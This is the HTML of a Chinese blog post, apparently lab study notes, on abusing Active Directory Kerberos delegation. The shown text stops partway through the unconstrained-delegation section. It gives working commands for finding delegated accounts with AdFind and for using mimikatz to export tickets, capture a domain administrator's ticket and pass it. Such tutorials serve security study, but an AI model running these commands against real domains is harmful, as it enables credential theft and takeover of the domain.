@@ -1,0 +1,1621 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+<script>
+
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+
+</script>
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/hacker-32x32.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/hacker-16x16.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="学习笔记,委派攻击," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Ax-x" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="域委派是将域用户的权限委派给服务账号，委派之后，服务账号就可以以域用户的身份去做域用户能够做的事">
+<meta property="og:type" content="article">
+<meta property="og:title" content="委派攻击">
+<meta property="og:url" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="Ax-x">
+<meta property="og:description" content="域委派是将域用户的权限委派给服务账号，委派之后，服务账号就可以以域用户的身份去做域用户能够做的事">
+<meta property="og:locale">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671662723958-1d89c1f6-9b97-42ff-9704-66cf77624367.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671663278409-d68390ce-b72a-4584-83d3-1fce773c4c41.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671663403768-36db07c4-fd91-44e9-b114-c570bc1d6910.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671663535493-453d4a1c-468d-4bb4-a6ca-22cc576c64b1.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671663588866-3d071c5a-2e6a-4c05-84d9-42d6bfa0ab07.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671664750728-d972dc5d-7a40-4cca-a0da-3c512d667c65.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671664557864-5a0b3a40-eaaf-42b8-8a09-1fd6df6ad6e8.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671665610835-021c9709-280e-484d-8308-0a73b3d604cd.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671665723576-9ac3f75a-0548-453f-b056-2548003e879e.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671665786221-ad746702-8179-4979-80bd-2106503b50d8.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671665846784-0cc1113e-a196-430d-ba15-cbf910dd2926.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671666024350-5b90bc75-1cf7-45f6-810a-dc8a8c67999f.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671675532982-92f8c96f-7e16-41c8-a035-a99afd477054.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671675126996-3f6eb088-56de-4696-8567-785aa4cafa46.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671673099432-2bff5470-10c1-4dea-b798-fc8e1dbc2c31.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671673244176-02f83ccc-fcaf-483e-b742-ebb1d20a18b6.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671673368143-d4734a9f-c054-4c21-a689-fe6ae381e6de.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671674710152-284609df-060f-4231-94ad-be9cf8602d8a.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671690369631-0108d99a-7895-4094-a1bf-61608e6792f9.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671692512687-f6e192ae-36b0-4bbf-8900-ebef93223a0c.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671692612121-703a79fd-8b27-47eb-bca9-4a77920c5be3.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671692916532-8b1c2e49-8d12-4a3a-ab4c-59c7461db985.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671693011657-429ef9c7-97cd-445c-a207-8492ab74f57e.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671693632805-607ac41e-0ab5-49f2-a2ee-7ad366c19d47.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671694154247-f5e72d4c-c5f5-4189-965b-785fbcf53477.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671694204077-f6df04cc-e422-4089-a330-d53290531d82.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671694313146-c4324978-dc41-40d8-9c31-d032c03d311a.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671694364379-19aa2f47-c0fd-43af-9b7d-9d76f79d15aa.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671696561511-cb90e6c3-74f2-4637-81ec-fb1fbe86177c.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671696684726-9609046a-d78d-4a92-9f9d-198726bdaf23.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671696711519-04ac228d-07ab-4f36-a2b0-875faf494221.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671696889277-131e7014-adfb-48c8-8bd6-e901804c7efc.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671696987661-89d83899-136c-44bb-9b7f-a6deead9d875.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671697134556-c03c0b66-6821-4648-845a-f90daaee94a4.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671698334611-7e9e5a4a-4936-4915-b680-83c672688f30.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671698579737-59546b42-c473-4dc1-b802-cf9ee7bb6532.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671698980582-2ca68e19-5f7c-4acd-aa10-336d6c41bbcb.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671699025714-252cbde6-bc36-49ed-8174-e43f4a06ead0.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671699755181-94e2df5b-7541-4e59-a386-0271dfdae733.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671699773358-6ddaa538-dfc0-45cc-8262-4b5b33d5ce7b.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671699872781-b6339f1e-1c23-4808-9973-5fcbadd974a5.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671699897261-c8a986dd-6a21-4ffc-8df8-4ea3d34b7eb3.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671700274299-c3e80e6b-1419-4946-ad0a-e5aefec19aec.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671702110983-0171f513-ddeb-4811-958c-44189de6ce3e.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671702393664-42c29bc5-a6dc-4b1a-9e93-299292786b67.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671703274094-f482a782-d12f-4d3b-981d-16b4f538c905.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671760081694-be6abb64-9db1-4376-8b7e-6ee341b7edea.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671760156107-f600eaee-867e-4e53-bc55-98c2c15b5d56.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671760188824-4c4e99ea-bb57-4129-8503-18f74ad8629f.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671760722919-7ac55a15-184b-4ac1-86c7-78dc3031b687.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671761103844-f14ffdce-5222-4c27-b050-c4b1c765276d.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671761908722-3fcde04e-474a-41f7-b108-8cfac2269788.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671764379066-a8b1f465-ff95-4989-a534-480586f23883.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671763718268-007680fc-f457-44d3-977f-3198d157a939.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671774718642-073d69ac-e364-4875-b1f9-6c50ac6f3c4b.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671774874760-1c9cb69a-ffcf-4192-baf8-70d6a8b45172.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671775065217-ab63423c-b00c-494b-8d8d-3672fe5051e4.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671775159928-e5adb83b-3e7f-4d8e-898e-f5583553bc87.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671775293314-0add2510-badc-46ab-b97d-fce2e60b161a.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671775620499-3ba24a01-7f0f-40b0-89fa-0c448f879a96.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671775677591-4153a0bf-5746-4f05-adf9-1fc962564a5b.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671777284612-52b31247-7fad-4ef1-8b89-87108ac255fe.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671777385300-b57af9a8-de60-4a64-a0a9-7b0530b641d7.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671777470924-d838f54c-ff04-4fff-ae10-75af15dd4caf.png">
+<meta property="og:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671777601085-f24a2392-a161-4c40-bf6a-0b326404bf47.png">
+<meta property="article:published_time" content="2023-04-19T13:05:14.000Z">
+<meta property="article:modified_time" content="2023-04-19T13:06:39.664Z">
+<meta property="article:author" content="Ax-x">
+<meta property="article:tag" content="学习笔记">
+<meta property="article:tag" content="委派攻击">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671662723958-1d89c1f6-9b97-42ff-9704-66cf77624367.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://ax-x.github.io/2023/04/19/委派攻击/"/>
+
+
+
+
+
+  <title>委派攻击 | Ax-x</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Ax-x</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">以有限的时间，做无限的事情</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br />
+            
+            日程表
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/head_portrait.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ax-x">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">委派攻击</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2023-04-19T21:05:14+08:00">
+                2023-04-19
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2023-04-19T21:06:39+08:00">
+                2023-04-19
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91/" itemprop="url" rel="index">
+                    <span itemprop="name">内网</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  4.3k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  17
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="域委派"><a href="#域委派" class="headerlink" title="域委派"></a>域委派</h2><p>是将域用户的权限委派给服务账号，委派之后，服务账号就可以以域用户的身份去做域用户能够做的事</p>
+<span id="more"></span>
+<p>注意：能够被委派的用户只能是服务账号或者机器账号</p>
+<p>1.机器账户:活动目录中的computers组内的计算机，也被称为机器账号。</p>
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671662723958-1d89c1f6-9b97-42ff-9704-66cf77624367.png" alt="img"></p>
+<p>2、服务账号：域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内，比如：SQLServer，MYSQL等，还有就是域用户通过注册SPN也能成为服务账号。</p>
+<p>服务账号（Service Account），域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。就比如 SQL Server在安装时，会在域内自动注册服务账号SqlServiceAccount，这类账号不能用于交互式登录。</p>
+<h2 id="委派的分类"><a href="#委派的分类" class="headerlink" title="委派的分类"></a>委派的分类</h2><ul>
+<li>非约束委派(Unconstrained Delegation, UD)</li>
+<li>约束委派(Constrained Delegation, CD)</li>
+<li>基于资源的约束委派(Resource Based Constrained Delegation, RBCD)</li>
+</ul>
+<h2 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h2><p>在域中如果出现A使用Kerberos身份验证访问域中的服务B,而B再利用A的身份去请求域中的服务C，这个过程就可以理解为委派</p>
+<h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p>WIN2016 域控 hostname：DC ip：10.1.20.10</p>
+<p>win2016 域机器 hostname：WEB ip：10.1.20.16</p>
+<p>域用户 hero 1qaz@WSX</p>
+<h4 id="设置非约束性委派"><a href="#设置非约束性委派" class="headerlink" title="设置非约束性委派"></a>设置非约束性委派</h4><p>机器账户的非约束性委派设置</p>
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671663278409-d68390ce-b72a-4584-83d3-1fce773c4c41.png" alt="img"></p>
+<p>服务账户的非约束委派设置</p>
+<p>hero是普通域用户 默认是没有委派设置的</p>
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671663403768-36db07c4-fd91-44e9-b114-c570bc1d6910.png" alt="img"></p>
+<p>给域用户注册SPN</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A priv/test hero</span><br></pre></td></tr></table></figure>
+
+<p>在域控上执行</p>
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671663535493-453d4a1c-468d-4bb4-a6ca-22cc576c64b1.png" alt="img"><br>然后查看hero用户</p>
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671663588866-3d071c5a-2e6a-4c05-84d9-42d6bfa0ab07.png" alt="img"></p>
+<p>已经有了委派属性然后设置为非约束委派</p>
+<p>查询域内设置了非约束委派的服务账户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=test,DC=local&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671664750728-d972dc5d-7a40-4cca-a0da-3c512d667c65.png" alt="img"></p>
+<p>查询域内设置了非约束委派的机器账户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=test,DC=local&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671664557864-5a0b3a40-eaaf-42b8-8a09-1fd6df6ad6e8.png" alt="img"></p>
+<p>域内域控机器账户默认设置了非约束委派</p>
+<h4 id="利用方式1"><a href="#利用方式1" class="headerlink" title="利用方式1"></a>利用方式1</h4><p><strong>需要2个条件</strong></p>
+<ul>
+<li>域管理员访问被控机器</li>
+<li>找到配置了非约束委派的机器（机器账户） 并且获取了其管理员权限</li>
+</ul>
+<p>只要域控与被控机器建立ipc连接，就能在受控机器上使用mimikatz抓取域管票据。然后使用mimikatz进行PTT，就能在受控机器上与域控建立ipc连接。</p>
+<p>这里利用WEB演示，直接用administrator登录，把mimikatz传上去，先查看本地票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671665610835-021c9709-280e-484d-8308-0a73b3d604cd.png" alt="img"></p>
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671665723576-9ac3f75a-0548-453f-b056-2548003e879e.png" alt="img"></p>
+<p>使用域控访问WEB,在域控上执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\web.test.local</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671665786221-ad746702-8179-4979-80bd-2106503b50d8.png" alt="img"></p>
+<p>然后回到WEB 重新导出票据，多了一个域管理员的票据</p>
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671665846784-0cc1113e-a196-430d-ba15-cbf910dd2926.png" alt="img"></p>
+<p>也就是说，只有当域控访问了被控制机器，mimikatz才能抓到域管的票据</p>
+<p>mimikatz导入域管票据，进行PTT攻击。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt [0;142305]-2-0-60a10000-Administrator@krbtgt-TEST.LOCAL.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p>再次访问，成功访问。</p>
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671666024350-5b90bc75-1cf7-45f6-810a-dc8a8c67999f.png" alt="img"></p>
+<p>查看列表以及清除缓存</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::list&quot; &quot;exit&quot;</span><br><span class="line">mimikatz.exe &quot;kerberos::purge&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p>思考1:怎么知道域管理员访问了被控机器？</p>
+<ul>
+<li>当域控访问了被控制机器，mimikatz才能抓到域管的票据</li>
+</ul>
+<p>思考2:受控机器，是否必须入域机器？不能为工作组？</p>
